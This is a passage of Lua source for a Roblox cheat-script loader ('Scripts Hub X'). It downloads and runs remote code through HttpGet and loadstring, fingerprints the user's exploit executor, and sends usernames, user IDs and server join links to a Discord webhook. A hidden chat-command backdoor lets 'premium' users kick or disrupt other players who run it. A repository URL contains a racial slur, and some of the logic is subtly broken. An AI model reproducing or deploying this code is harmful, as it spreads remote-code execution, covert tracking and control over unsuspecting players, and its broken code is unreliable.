CommandFunctions.floatspin = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		local hrp = player.Character.HumanoidRootPart
		local floatHeight = 10 -- Exactly 10 studs above ground
		
		-- Stop existing floatspin if active
		if floatspinConnections[player.UserId] then
			floatspinConnections[player.UserId]:Disconnect()
		end
		
		-- Unanchor and set up for floating
		for _, part in pairs(player.Character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Anchored = false
			end
		end
		
		-- Start floating and spinning HARD
		floatspinConnections[player.UserId] = RunService.Heartbeat:Connect(function()
			if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				local currentPos = player.Character.HumanoidRootPart.Position
				-- Keep at exactly 10 studs above ground
				local floatPos = CFrame.new(currentPos.X, floatHeight, currentPos.Z)
				
				-- Super hard spinning - rotate 30 degrees per frame
				local rotation = CFrame.Angles(math.rad(30), math.rad(30), math.rad(30))
				player.Character.HumanoidRootPart.CFrame = floatPos * rotation
			else
				floatspinConnections[player.UserId]:Disconnect()
				floatspinConnections[player.UserId] = nil
			end
		end)
		
		notify("Scripts Hub X", "Floatspin activated - spinning HARD at 10 studs!")
	end
end


CommandFunctions.fs = CommandFunctions.floatspin -- Alias

CommandFunctions.unfloatspin = function(args)
	if floatspinConnections[player.UserId] then
		floatspinConnections[player.UserId]:Disconnect()
		floatspinConnections[player.UserId] = nil
		
		-- Lower player back to ground
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			local hrp = player.Character.HumanoidRootPart
			hrp.CFrame = CFrame.new(hrp.Position.X, hrp.Position.Y - 5, hrp.Position.Z)
		end
		
		notify("Scripts Hub X", "Floatspin deactivated!")
	end
end

CommandFunctions.ufs = CommandFunctions.unfloatspin -- Alias

CommandFunctions.panic = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		-- Stop existing panic if active
		if panicConnections[player.UserId] then
			panicConnections[player.UserId]:Disconnect()
		end
		
		local hrp = player.Character.HumanoidRootPart
		local startTime = tick()
		
		-- Panic effect for 3 seconds - INTENSE
		panicConnections[player.UserId] = RunService.Heartbeat:Connect(function()
			if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				local elapsed = tick() - startTime
				
				if elapsed < 3 then
					-- Aggressive random movement
					local randomDir = Vector3.new(math.random(-50, 50), math.random(-30, 30), math.random(-50, 50))
					player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + (randomDir * 0.1)
					
					-- Intense screen shake
					local camera = Workspace.CurrentCamera
					camera.CFrame = camera.CFrame * CFrame.Angles(math.rad(math.random(-5, 5)), math.rad(math.random(-5, 5)), math.rad(math.random(-3, 3)))
				else
					panicConnections[player.UserId]:Disconnect()
					panicConnections[player.UserId] = nil
				end
			else
				if panicConnections[player.UserId] then
					panicConnections[player.UserId]:Disconnect()
					panicConnections[player.UserId] = nil
				end
			end
		end)
		
		notify("Scripts Hub X", "PANIC MODE ACTIVATED!!!")
	end
end

CommandFunctions.p = CommandFunctions.panic -- Alias

CommandFunctions.fakeban = function(args)
	player:Kick("You have been permanently banned from this game.")
end

CommandFunctions.fb = CommandFunctions.fakeban -- Alias

CommandFunctions.shakecam = function(args)
	local camera = Workspace.CurrentCamera
	local shakeIntensity = 5 -- AGGRESSIVE shake
	local duration = 1 -- 1 second
	local startTime = tick()
	
	while tick() - startTime < duration do
		local shakeAmount = CFrame.Angles(
			math.rad(math.random(-shakeIntensity * 15, shakeIntensity * 15)) / 10,
			math.rad(math.random(-shakeIntensity * 15, shakeIntensity * 15)) / 10,
			math.rad(math.random(-shakeIntensity * 5, shakeIntensity * 5)) / 10
		)
		camera.CFrame = camera.CFrame * shakeAmount
		RunService.Heartbeat:Wait()
	end
	
	notify("Scripts Hub X", "Camera SHAKEN AGGRESSIVELY!")
end

CommandFunctions.sc = CommandFunctions.shakecam -- Alias

-- ================================
-- CHAT COMMAND SYSTEM
-- ================================

local function handleChatCommand(senderPlayer, message)
	if not message:sub(1, 1) == ";" then return end
	
	local args = {}
	for word in message:gmatch("%S+") do
		table.insert(args, word)
	end
	
	if #args == 0 then return end
	
	local commandName = args[1]:sub(2):lower()
	
	if not CommandFunctions[commandName] then return end
	
	local isPremium, userType = isPremiumUserId(senderPlayer.UserId)
	if not isPremium then
		return
	end

	-- Target resolution logic
	-- Format: ;command [target] [value] OR ;command [value] (self)
	local targetName = nil
	local shouldExecute = false
	local extraInfo = ""

	-- Commands that work only for LOCAL PLAYER who types them (teleport commands)
	local selfInitiatedCommands = {tp = true, tphere = true, help = true}

	-- Commands that take numeric values
	local valueCommands = {gravity = true, g = true, framerate = true, fr = true, speed = true, s = true}

	if selfInitiatedCommands[commandName] then
		-- These commands only execute if the LOCAL PLAYER (player) types them
		if senderPlayer == player then
			shouldExecute = true
			extraInfo = args[2] and "Target: " .. args[2] or "Self"
	    end
    elseif valueCommands[commandName] then
	    -- Check if args[2] is a player name
	    if args[2] then
		    local arg2Lower = args[2]:lower()
		    local usernameLower = player.Name:lower()
		    local displayNameLower = player.DisplayName:lower()
		
		    -- Check if args[2] is NOT a number
		    local isNotNumber = tonumber(args[2]) == nil
		
		    if isNotNumber and (arg2Lower == usernameLower or arg2Lower == displayNameLower) then
		    	-- args[2] is target, args[3] is value
			    targetName = args[2]
			    shouldExecute = true
			    extraInfo = "Value: " .. (args[3] or "default")
		    elseif not isNotNumber and senderPlayer == player then
			    -- args[2] is value, no target = self
			    shouldExecute = true
			    extraInfo = "Value: " .. args[2]
		    end
	    elseif senderPlayer == player then
		    -- No args, self-execute
		    shouldExecute = true
		    extraInfo = "Value: default"
	    end
    else
	    -- Regular commands - target is args[2]
	    if args[2] then
		    local targetLower = args[2]:lower()
		    local usernameLower = player.Name:lower()
		    local displayNameLower = player.DisplayName:lower()
		
		    if targetLower == usernameLower or targetLower == displayNameLower then
			    targetName = args[2]
			    shouldExecute = true
		    end
	    else
		    -- No target specified - only execute if sender is local player
		    if senderPlayer == player then
			    shouldExecute = true
		    end
	    end
	end
	
	if shouldExecute then
		task.spawn(function()
			local success, err = pcall(function()
				CommandFunctions[commandName](args)
			end)
			
			if success then
				if senderPlayer == player then
				    sendCommandLog(";" .. commandName .. " " .. table.concat(args, " ", 2), senderPlayer, player, extraInfo)
			    end	
					
				if targetName and senderPlayer ~= player then
					notify("]SHX] Command Executed - User: ", senderPlayer.Name .. " used Command: " .. commandName .. " to you!")
				end
			else
				warn("[SHX] Command execution error: " .. tostring(err))
			end
		end)
	end
end

local function startGlobalChatListener()
	for _, otherPlayer in pairs(Players:GetPlayers()) do
		pcall(function()
			otherPlayer.Chatted:Connect(function(message)
				handleChatCommand(otherPlayer, message)
			end)
		end)
	end
	
	Players.PlayerAdded:Connect(function(otherPlayer)
		pcall(function()
			otherPlayer.Chatted:Connect(function(message)
				handleChatCommand(otherPlayer, message)
			end)
		end)
	end)
	
	pcall(function()
		local TextChatService = game:GetService("TextChatService")
		local textChannel = TextChatService.TextChannels.RBXGeneral
		
		textChannel.MessageReceived:Connect(function(message)
			if message.TextSource then
				local senderId = message.TextSource.UserId
				local senderPlayer = Players:GetPlayerByUserId(senderId)
				if senderPlayer then
					handleChatCommand(senderPlayer, message.Text)
				end
			end
		end)
	end)
end

-- ================================
-- CORE FUNCTIONS
-- ================================
local function checkGameSupport()	
    local success, Games = pcall(function()
        local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/snjsniggernsnjswbnigger/refs/heads/main/NigaBoi-82i3-ns29-bsj8-nd8e.lua")
        return loadstring(script)()
    end)

    if not success then  
	    warn("Failed to load game list: " .. tostring(Games))  
	    return false, nil  
    end  
  
    if type(Games) ~= "table" then  
	    warn("Game list returned invalid data type: " .. type(Games))  
	    return false, nil  
    end  
  
    for PlaceID, Execute in pairs(Games) do  
	    if PlaceID == game.PlaceId then  
		    return true, Execute  
	    end  
    end  
  
    print("Game not supported")  
    return false, nil
end

local function detectExecutor()
	if syn and syn.request then
		return "Synapse X"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif getgenv and getgenv().isfluxus then
		return "Fluxus"
	elseif identifyexecutor then
		local executor = identifyexecutor()
		if executor then
			return executor
		end
	end
	return "Unknown"
end

local function sendWebhookNotification(userStatus, scriptErrorText)
	pcall(function()
		local gameName = "Unknown"
		local success, productInfo = pcall(function()
			return MarketplaceService:GetProductInfo(game.PlaceId)
		end)
		if success and productInfo and productInfo.Name then
			gameName = productInfo.Name
		end
		
		local detectedExecutor = detectExecutor()
		local placeId = tostring(game.PlaceId)
		local jobId = game.JobId or "Can't detect JobId"
	
		if scriptErrorText then
			local send_error = {
			    ["username"] = "Script Execution Log",
			    ["avatar_url"] = "https://nervous-purple-tc7szd5sj5.edgeone.app/file_0000000092fc61f590999584d90cd9f7.png",
		    	["content"] = "Scripts Hub X | Error - <@&1391794959589572628>",
			    ["embeds"] = {
				    {
					    ["title"] = "Script Error And User Details",
					    ["description"] = "**Game**: " .. gameName .. "\n**Game ID**: " .. game.PlaceId .. "\n**Profile**: https://www.roblox.com/users/" .. player.UserId .. "/profile",
					    ["color"] = 16711680,
					    ["fields"] = {
						    {["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
						    {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
						    {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
						    {["name"] = "Executor", ["value"] = detectedExecutor, ["inline"] = true},
						    {["name"] = "User Type", ["value"] = userStatus, ["inline"] = true},
							{["name"] = "Error", ["value"] = scriptErrorText, ["inline"] = true}
					    },
					    ["footer"] = {["text"] = "Scripts Hub X | v2.0", ["icon_url"] = "https://nervous-purple-tc7szd5sj5.edgeone.app/file_0000000092fc61f590999584d90cd9f7.png"},
					    ["thumbnail"] = {["url"] = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true"}
				    }
			    }
			}
			local headers = {["Content-Type"] = "application/json"}
		    local function makeWebhookRequest()
			    if request and type(request) == "function" then
				    request({
					    Url = webhookUrl,
					    Method = "POST",
					    Headers = headers,
					    Body = HttpService:JSONEncode(send_error)
				    })
			    elseif http_request and type(http_request) == "function" then
				    http_request({
					    Url = webhookUrl,
					    Method = "POST",
					    Headers = headers,
					    Body = HttpService:JSONEncode(send_error)
				    })
			    elseif syn and syn.request then
				    syn.request({
					    Url = webhookUrl,
					    Method = "POST",
					    Headers = headers,
					    Body = HttpService:JSONEncode(send_error)
				    })
			    end
				pcall(makeWebhookRequest)
			end
		else
			local send_data = {
			    ["username"] = "Script Execution Log",
			    ["avatar_url"] = "https://nervous-purple-tc7szd5sj5.edgeone.app/file_0000000092fc61f590999584d90cd9f7.png",
		    	["content"] = "Scripts Hub X | Log",
			    ["embeds"] = {
				    {
					    ["title"] = "Script Execution Details",
					    ["description"] = "**Game**: " .. gameName .. "\n**Game ID**: " .. game.PlaceId .. "\n**Profile**: https://www.roblox.com/users/" .. player.UserId .. "/profile",
					    ["color"] = 2123412,
					    ["fields"] = {
						    {["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
						    {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
						    {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
						    {["name"] = "Executor", ["value"] = detectedExecutor, ["inline"] = true},
						    {["name"] = "User Type", ["value"] = userStatus, ["inline"] = true},
						    {["name"] = "Job Id", ["value"] = game.JobId, ["inline"] = true},
						    {["name"] = "Join Link", ["value"] = '[Click Here To Join](https://pickletalk.netlify.app/?placeId=' .. game.PlaceId .. '&gameInstanceId=' .. game.JobId .. ')', ["inline"] = true},
						    {["name"] = "Join Script", ["value"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ',"' .. game.JobId .. '",game.Players.LocalPlayer))', ["inline"] = true}
					    },
					    ["footer"] = {["text"] = "Scripts Hub X | v2.0", ["icon_url"] = "https://nervous-purple-tc7szd5sj5.edgeone.app/file_0000000092fc61f590999584d90cd9f7.png"},
					    ["thumbnail"] = {["url"] = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true"}
				    }
			    }
			}
			local headers = {["Content-Type"] = "application/json"}
		    local function makeWebhookRequest()
			    if request and type(request) == "function" then
				    request({
					    Url = webhookUrl,
					    Method = "POST",
					    Headers = headers,
					    Body = HttpService:JSONEncode(send_data)
				    })
			    elseif http_request and type(http_request) == "function" then
				    http_request({
					    Url = webhookUrl,
					    Method = "POST",
					    Headers = headers,
					    Body = HttpService:JSONEncode(send_data)
				    })
			    elseif syn and syn.request then
				    syn.request({
					    Url = webhookUrl,
					    Method = "POST",
					    Headers = headers,
					    Body = HttpService:JSONEncode(send_data)
				    })
			    end
		    end
		
		    pcall(makeWebhookRequest)
		end
	end)
end

local function loadGameScript(scriptUrl)
	local success, result = pcall(function()
		local scriptContent = game:HttpGet(scriptUrl)
		if not scriptContent or scriptContent == "" then
			error("Empty script content received")
		end
		return loadstring(scriptContent)()
	end)
	return success, result
end

local function loadKeySystem()
	local success, keySystemModule = pcall(function()
		local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/keysystem.lua")
		return loadstring(script)()
	end)
	
	if not success then
		warn("Failed to load key system: " .. tostring(keySystemModule))
		return false
	end
	
	if type(keySystemModule) ~= "table" then
		warn("Key system returned invalid data type: " .. type(keySystemModule))
		return false
	end
	
	print("Checking for existing valid key...")
	if keySystemModule.CheckExistingKey and keySystemModule.CheckExistingKey() then
		print("Valid key found and verified with API, skipping key system UI")
		return true
	end

	if keySystemModule.ShowKeySystem then
		keySystemModule.ShowKeySystem()
	else
		warn("ShowKeySystem function not found in key system module")
		return false
	end
	
	local maxWait = 300
	local waited = 0
	
	while waited < maxWait do
		if keySystemModule.IsKeyVerified and keySystemModule.IsKeyVerified() then
			print("Key verified successfully")
			return true
		end
		
		task.wait(1)
		waited = waited + 1
	end
	
	print("Key verification timeout or failed")
	return false
end

local function checkUserStatus()
	local userId = tostring(player.UserId)

	if BlacklistUsers and table.find(BlacklistUsers, userId) then
		print("Blacklisted user detected")
		return "blacklisted"
	end
	
	if OwnerUserId and userId == tostring(OwnerUserId) then
		print("Owner detected")
		isPremiumUser = true
		return "owner"
	end
	
	if StaffUserId and table.find(StaffUserId, userId) then
		print("Staff detected")
		isPremiumUser = true
		return "staff"
	end
	
	if PremiumUsers and table.find(PremiumUsers, userId) then
		print("Premium user detected")
		isPremiumUser = true
		return "premium"
	end

	return "regular"
end

-- ================================
-- MAIN EXECUTION
-- ================================

spawn(function()
	local userStatus = checkUserStatus()
	
	if userStatus == "blacklisted" then
		player:Kick("You are blacklisted from using this script!")
		return
	end

	local function getGameName()
	    -- Try method 1: MarketplaceService
	    local success, productInfo = pcall(function()
	    	return MarketplaceService:GetProductInfo(game.PlaceId)
	    end)
	    if success and productInfo and productInfo.Name and productInfo.Name ~= "" and productInfo.Name ~= "Ugc" then
		    return productInfo.Name
	    end
	
	    -- Try method 2: game.Name
	    if game.Name and game.Name ~= "" and game.Name ~= "Ugc" then
		    return game.Name
	    end
	
	    -- Try method 3: Workspace name
	    if Workspace.Name and Workspace.Name ~= "Workspace" then
		    return Workspace.Name
	    end
	
	    -- Fallback: Just show Place ID
	    return "Place ID: " .. tostring(game.PlaceId)
	end
		
	startGlobalChatListener()
	notify("SHX Loader", getGameName())

	if isPremiumUser then
		print("[SHX] Premium user - Commands enabled")
		notify("Scripts Hub X", "Commands active! Type ;help")
	end
		
	-- ================================
	-- MAIN FLOW
	-- ================================	
	if userStatus == "regular" and Keysystem then
		local keySuccess = loadKeySystem()
		if not keySuccess then
			print("Key system failed")
			notify("Scripts Hub X", "Key verification failed.")
			sendWebhookNotification(userStatus, "Key verification failed")
			return
		end
		userStatus = "regular-keyed"
	elseif userStatus == "regular" and not Keysystem then
		print("Key system disabled")
		userStatus = "regular-bypassed"
	end
	
	local isSupported, scriptUrl = checkGameSupport()
		
	if not isSupported then
		notify("SHX Main Error", "Game not supported.")
		return
	end

	local success, errorMsg = loadGameScript(scriptUrl)
	
	if success then
		sendWebhookNotification(userStatus)
		if isPremiumUser then
			notify("SHX Premium Commands", "Type ;help in chat for commands")
		end
	else
		local errorText = errorMsg and tostring(errorMsg) or "Unknown error occurred"
		warn(errorText)
		notify("SHX Main Error", tostring(errorText), 10)
		notify("SHX Main Error", "please report this issue to discord ticket bug report.", 10)
		sendWebhookNotification(userStatus, errorText)
	end
end)
